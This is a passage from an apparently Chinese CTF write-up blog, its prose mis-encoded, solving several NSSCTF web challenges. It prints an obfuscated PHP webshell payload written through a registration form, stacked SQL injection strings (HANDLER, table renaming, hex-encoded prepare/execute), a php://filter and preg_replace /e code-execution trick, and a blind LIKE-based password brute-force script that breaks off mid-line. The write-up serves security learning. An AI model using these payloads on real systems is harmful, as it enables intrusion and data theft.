class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#<span class="title">forgot</span>&quot;&gt;<span class="title">Forgot</span> <span class="title">Password</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">						&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">						&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Website</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">website</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Punctuation</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">punctuation</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">Up</span>&quot;&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">								&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot;&gt;<span class="title">Already</span> <span class="title">Member</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">							&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">						&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">	</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä¸Šæ–¹ä»£ç å‘ç°å­˜åœ¨file_put_contentsï¼Œå¯ä»¥å¯¹phpæ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p>æœ‰å››ä¸ªé€‰æ‹©ï¼Œé€‰å“ªä¸ªå¥½å‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹template.htmlï¼Œå¹¶æ‰¾åˆ°å…³é”®ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        &lt;li&gt;&lt;span class=&quot;adminImg&quot;&gt;&lt;/span&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			error_reporting(0);</span><br><span class="line">			$user = ((string)__USER__);</span><br><span class="line">			$pass = ((string)__PASS__);</span><br><span class="line">			</span><br><span class="line">			if(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;</span><br><span class="line">				echo($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &lt;ul class=&quot;item&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;sitting_btn&quot;&gt;&lt;/span&gt;ç³»ç»Ÿè®¾ç½®&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;help_btn&quot;&gt;&lt;/span&gt;ä½¿ç”¨æŒ‡å— &lt;b&gt;&lt;/b&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;about_btn&quot;&gt;&lt;/span&gt;å…³äºæˆ‘ä»¬&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;logout_btn&quot;&gt;&lt;/span&gt;é€€å‡ºç³»ç»Ÿ&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; class=&quot;powered_by&quot;&gt;__PUNC__&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>åªæœ‰__PUNC__æ˜¯æœ€å¥½åˆ©ç”¨çš„ï¼Œä½†æ˜¯é—®å·è¢«è¿‡æ»¤äº†ï¼Œæƒ³è¦è®©å®ƒè§£æphpï¼Œè¿™æ—¶å°±éœ€è¦å®ƒåœ¨ä¸Šé¢çš„phpé‡Œé¢ï¼Œä½†æ˜¯ä¸Šé¢çš„phpè¢«é—­åˆè¿‡äº†ï¼Œä½†æ˜¯æˆ‘ä»¬åˆå‘ç°å…¶å®__USER__ï¼Œ__PASS__è¿™äº›éƒ½æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šè¡Œæ³¨é‡Šæ¥è§£å†³é—®é¢˜ã€‚æœ€åå†æŠŠåé¢çš„æ³¨é‡Šæ‰å°±è¡Œï¼Œä¸ç„¶æ ‡ç­¾é—­åˆä¼šå‡ºç°é—®é¢˜ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ³¨å†Œæ—¶ç”¨æˆ·åä¸ºa/*</span><br><span class="line">å¯†ç ä¸ºa</span><br><span class="line">websiteä¸ºa</span><br><span class="line">æè¿°ä¸º*/);$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*</span><br><span class="line">å³å¯ï¼Œæ— æ•°å­—å­—æ¯rceï¼Œç®€å•çš„å¾ˆ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129185322665.png" alt="image-20241129185322665"></p>
<p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯è·å–flag</p>
<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>sqlæ³¨å…¥é¢˜</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081543495.png" alt="image-20241201081543495"></p>
<p>å­˜åœ¨è¿‡æ»¤ï¼Œä¸å¥½ç›´æ¥è”åˆæ³¨å…¥å•Š</p>
<p>è¯•è¯•å †å </p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081821727.png" alt="image-20241201081821727" style="zoom:67%;" />

<p>å­˜åœ¨å †å æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">1&#x27;;show tables;#</span><br><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081952743.png" alt="image-20241201081952743" style="zoom:67%;" />

<p>ä½†æ˜¯è¿™é‡Œselectç­‰è¢«è¿‡æ»¤äº†ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<blockquote>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p>
</blockquote>
<blockquote>
<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p>
<p>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082223713.png" alt="image-20241201082223713"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;64bfe910-ba05-4133-8fdf-11bdf68fd5ce&#125;</span><br></pre></td></tr></table></figure>



<p>ä»¥ä¸Šä¸ºç¬¬ä¸€ç§æ–¹æ³•</p>
<p>è¿˜æœ‰ä¸¤ç§æ€è·¯ï¼ï¼ï¼</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082453677.png" alt="image-20241201082453677" style="zoom:67%;" />

<p>ç›´æ¥æŸ¥1ï¼Œæœåˆ°çš„æ˜¯wordsè¡¨çš„ç›¸å…³å†…å®¹ï¼Œè€Œæœä¸åˆ°flagè¡¨çš„ç›¸å…³å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥æŠŠflagè¡¨å˜æˆwordsè¡¨å‘¢ï¼Œé‚£ä¸å°±å¯ä»¥ç›´æ¥æœåˆ°flagè¡¨çš„å†…å®¹äº†å—ï¼Ÿï¼</p>
<blockquote>
<p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p>
<p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p>
<p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p>
<p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082658543.png" alt="image-20241201082658543"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<blockquote>
<p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†select * from <code>1919810931114514</code>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p>
<p>å†é€šè¿‡æ„é€ payloadå¾—</p>
<p>1â€™;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p>
<p>è¿›è€Œå¾—åˆ°flag</p>
</blockquote>
<p>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</p>
<p>executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚</p>
<p>SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</p>
<h2 id="BJDCTF-2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF-2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF 2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF 2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28418/?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥è¯•äº†ä¸€ä¸‹filterchainï¼Œå¯ä»¥ç”¨æ˜¯å¯ä»¥ç”¨ä½†æ˜¯flagå‡ºä¸æ¥ï¼Œå¯èƒ½è¢«ç‰¹æ„è®¾è®¡äº†</p>
<p>è¿™é‡Œä¸»è¦æ¶‰åŠåˆ°<code>preg_replace</code>çš„ä¸€ä¸ªRCEæ¼æ´ï¼Œå‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p>ä¸»è¦å°±æ˜¯æ„é€ <code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;æ­¤å¤„å¡«å‡½æ•°å&#125;&#125;);</code><br> å¤§æ¦‚å°±æ˜¯æŠŠæ‰€æœ‰å­—ç¬¦æ›¿æ¢ä¸ºå‡½æ•°æ‰§è¡Œç»“æœã€‚<br> ä½†æ˜¯GETä¼ <code>.*=xxx</code>ä¼šå‡ºé—®é¢˜ï¼Œè‡ªåŠ¨å°†ç¬¬ä¸€ä¸ªéæ³•å­—ç¬¦è½¬åŒ–ä¸ºä¸‹åˆ’çº¿ï¼ˆçœ‹é“¾æ¥ï¼‰ï¼Œæ‰€ä»¥æ„é€ ï¼š</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201090321285.png" alt="image-20241201090321285" style="zoom: 67%;" />

<p>è¿™é‡Œæ²¡æœ‰å‡ºflagï¼Œé‚£å°±æ˜¯ç¯å¢ƒé—®é¢˜äº†ï¼Œä¹‹å‰çš„filterchainåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ï¼</p>
<h2 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=_POST[â€˜passwdâ€™];</span><br><span class="line">sql=&quot;SELECT passwd FROM users WHERE username=â€²bilalaâ€² and passwd=â€²passwordâ€™;&quot;;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œusernameä¸ºbilalaï¼Œpasswordå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¯ä»¥è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•ã€‚</p>
<p>å…ˆfuzzä¸€ä¸‹ï¼Œå­˜åœ¨waf</p>
<p>å‘ç°likeå’Œç™¾åˆ†å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç›´æ¥çˆ†ç ´å¯†ç äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:23092/login.php&#x27;</span></span><br><span class="line">str_sum=string.digits+string.ascii_letters</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_sum:</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bilala&quot;</span>,<span class="string">&quot;passwd&quot;</span>:<span class="string">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class="subst">&#123;flag+j&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">        res=requests.post(url,data)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span 